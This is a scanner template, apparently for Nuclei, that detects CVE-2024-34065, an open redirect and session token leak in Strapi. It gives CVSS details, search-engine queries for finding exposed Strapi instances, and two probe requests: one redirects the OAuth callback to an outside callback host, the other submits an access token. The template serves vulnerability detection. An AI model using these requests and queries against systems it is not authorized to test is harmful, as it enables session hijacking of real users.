id: CVE-2024-34065

info:
  name: Strapi Open Redirect and Session Token Leakage
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Strapi is vulnerable to an open redirect and session token sent as URL query parameter before version 4.24.2. This can allow an unauthenticated attacker to bypass authentication mechanisms and retrieve 3rd party tokens with user interaction.
  impact: |
    Attackers can redirect users to malicious sites and steal session tokens.
  remediation: |
    Upgrade Strapi CMS to the latest version to mitigate the vulnerabilities.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N
    cvss-score: 7.1
    cve-id: CVE-2024-34065
    cwe-id: CWE-294
    epss-score: 0.00087
    epss-percentile: 0.38734
    cpe: cpe:2.3:a:strapi:strapi:*:*:*:*:*:*:*:*
  metadata:
    vendor: strapi
    product: strapi
    shodan-query:
      - http.html:"welcome to your strapi app"
      - http.title:"strapi"
      - http.title:"welcome to your strapi app"
    fofa-query:
      - app="strapi-headless-cms"
      - body="welcome to your strapi app"
      - title="strapi"
      - title="welcome to your strapi app"
    google-query:
      - intitle:"strapi"
      - intitle:"welcome to your strapi app"

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/connect/microsoft?callback=http://{{interactsh-url}}/"

    matchers:
      - type: word
        words:
          - "Redirecting"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/auth/microsoft/callback?access_token={{token}}"

    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "jwt"
        part: body
